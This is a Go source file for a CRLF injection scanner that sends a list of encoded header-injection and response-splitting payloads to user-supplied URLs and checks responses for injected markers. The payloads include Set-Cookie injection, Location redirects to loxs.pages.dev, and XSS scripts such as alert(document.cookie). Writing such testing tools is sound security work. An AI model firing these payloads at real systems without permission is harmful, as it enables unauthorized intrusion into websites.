package main

import (
	"fmt"
	"io"
	"net/http"
	"regexp"
	"strings"
)

// crlfRegexPatterns are the exact two patterns used by the Python
// run_crlf_scanner, copied character-for-character.
var crlfRegexPatterns = []string{
	`(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)loxs\.pages\.dev\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?loxs=injected(?:\s*?)(?:$|;)))`,
	`(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)loxs\.pages\.dev\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?loxs=injected(?:\s*?)(?:$|;)|loxs-x))`,
}

var crlfCompiledRegex []*regexp.Regexp

func init() {
	for _, p := range crlfRegexPatterns {
		crlfCompiledRegex = append(crlfCompiledRegex, regexp.MustCompile(p))
	}
}

// runCRLFScanner implements the CRLF injection scanner from the Python.
//   - generates ~32 CRLF payloads from the base list with {{Hostname}} replaced
//     by the URL's netloc
//   - for each payload: HTTP GET, allow_redirects=false, verify=false, timeout=10s
//   - matches the two CRLF regex patterns against every response header
//     string and the response body (case-insensitive)
//   - threads 1-10, default 5
//   - prints per-payload scan lines, summary box, offers HTML report.
func runCRLFScanner() {
	clearScreen()
	printCRLFBanner()
	fmt.Println(colorGreen + "Welcome to the CRLF Injection Testing Tool!" + colorReset)

	urls := promptForURLsMSG("Welcome to the CRLF Injection Testing Tool!\n")
	threads := promptThreadCount1To10()

	fmt.Printf("\n%s[i] Loading, Please Wait...%s\n", colorYellow, colorReset)
	clearScreen()
	fmt.Printf("%s[i] Starting scan...\n\n%s", colorCyan, colorReset)

	state := NewScanState()
	startTime := now()
	client := newHTTPClientNoRedirect()

	for _, url := range urls {
		printURLBox(url)
		payloads := loadCRLFPayloads(getDomain(url))

		type job struct {
			idx     int
			payload string
		}
		jobs := make(chan job)
		done := make(chan struct{})
		for w := 0; w < threads; w++ {
			go func() {
				for j := range jobs {
					checkCRLF(client, url, j.payload, state)
				}
				done <- struct{}{}
			}()
		}
		for i, p := range payloads {
			jobs <- job{idx: i, payload: p}
		}
		close(jobs)
		for i := 0; i < threads; i++ {
			<-done
		}

		state.AddScannedN(len(payloads))
	}

	_, vulnURLs, found, scanned := state.Snapshot()
	printScanSummaryBox(found, scanned, elapsedSeconds(startTime))
	offerHTMLReport("Carriage Return Line Feed Injection (CRLF)", state, startTime)
	fmt.Printf("\n%s[!] No URLs were scanned or scan complete.%s\n", colorRed, colorReset)
	_ = vulnURLs
}

// checkCRLF makes one CRLF test, parses the response, and marks state.
func checkCRLF(client *http.Client, url, payload string, state *ScanState) {
	target := url + payload
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return
	}
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Connection", "close")

	start := nowUnixMilli()
	resp, err := client.Do(req)
	elapsedMs := nowUnixMilli() - start
	rt := float64(elapsedMs) / 1000.0
	if err != nil {
		fmt.Printf("%s[!] Error accessing %s: %s%s\n", colorRed, target, err, colorReset)
		return
	}
	defer resp.Body.Close()
	bodyBytes, _ := io.ReadAll(resp.Body)
	body := string(bodyBytes)

	var details []string
	vulnerable := false
	for h, values := range resp.Header {
		for _, v := range values {
			combined := h + ": " + v
			for _, re := range crlfCompiledRegex {
				if re.MatchString(strings.ToLower(combined)) {
					vulnerable = true
					details = append(details, fmt.Sprintf("Header Injection: %s", combined))
				}
			}
		}
	}
	if !vulnerable {
		for _, re := range crlfCompiledRegex {
			if re.MatchString(strings.ToLower(body)) {
				vulnerable = true
				details = append(details, "Body Injection: Detected CRLF in response body")
				break
			}
		}
	}

	fmt.Printf("%s[→] Scanning with payload: %s%s\n", colorYellow, payload, colorReset)
	if vulnerable && (resp.StatusCode == 200 || resp.StatusCode == 201 || resp.StatusCode == 202 ||
		resp.StatusCode == 204 || resp.StatusCode == 205 || resp.StatusCode == 206 ||
		resp.StatusCode == 207 || resp.StatusCode == 301 || resp.StatusCode == 302 ||
		resp.StatusCode == 307 || resp.StatusCode == 308) {
		fmt.Printf("%s[✓]%s Vulnerable: %s - Response Time: %.2f seconds%s\n",
			colorGreen, colorCyan, target, rt, colorReset)
		for _, d := range details {
			fmt.Printf("%s↪ %s%s\n", colorYellow, d, colorReset)
		}
		state.AddVulnerable(target)
	} else {
		fmt.Printf("%s[✗]%s Not Vulnerable: %s - Response Time: %.2f seconds%s\n",
			colorRed, colorCyan, target, rt, colorReset)
	}
}

// generateCRLFPayloads returns the 32 base CRLF payloads with {{Hostname}}
// replaced by the netloc of the target URL.
func generateCRLFPayloads(url string) []string {
	domain := getDomain(url)
	basePayloads := []string{
		"/%%0a0aSet-Cookie:loxs=injected",
		"/%0aSet-Cookie:loxs=injected;",
		"/%0aSet-Cookie:loxs=injected",
		"/%0d%0aLocation: http://loxs.pages.dev",
		"/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23",
		"/%0d%0a%0d%0a<script>alert('LOXS')</script>;",
		"/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e",
		"/%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('LOXS');</script>",
		"/%0d%0aHost: {{Hostname}}%0d%0aCookie: loxs=injected%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: loxs=injected%0d%0a%0d%0a",
		"/%0d%0aLocation: loxs.pages.dev",
		"/%0d%0aSet-Cookie:loxs=injected;",
		"/%0aSet-Cookie:loxs=injected",
		"/%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<svg/onload=alert(document.domain)>",
		"/%23%0aSet-Cookie:loxs=injected",
		"/%25%30%61Set-Cookie:loxs=injected",
		"/%2e%2e%2f%0d%0aSet-Cookie:loxs=injected",
		"/%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a<script>alert(document.cookie)</script>%2F../%2F..%2F..%2F..%2F../tr",
		"/%3f%0d%0aLocation:%0d%0aloxs-x:loxs-x%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(document.domain)</script>",
		"/%5Cr%20Set-Cookie:loxs=injected;",
		"/%5Cr%5Cn%20Set-Cookie:loxs=injected;",
		"/%5Cr%5Cn%5CtSet-Cookie:loxs%5Cr%5CtSet-Cookie:loxs=injected;",
		"/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:loxs=injected;",
		"/%E5%98%8A%E5%98%8DLocation:loxs.pages.dev",
		"/%E5%98%8D%E5%98%8ALocation:loxs.pages.dev",
		"/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected",
		"/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected;",
		"/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected",
		"/%u000ASet-Cookie:loxs=injected;",
		"/loxs.pages.dev/%2E%2E%2F%0D%0Aloxs-x:loxs-x",
		"/loxs.pages.dev/%2F..%0D%0Aloxs-x:loxs-x",
	}
	out := make([]string, len(basePayloads))
	for i, p := range basePayloads {
		out[i] = strings.ReplaceAll(p, "{{Hostname}}", domain)
	}
	return out
}
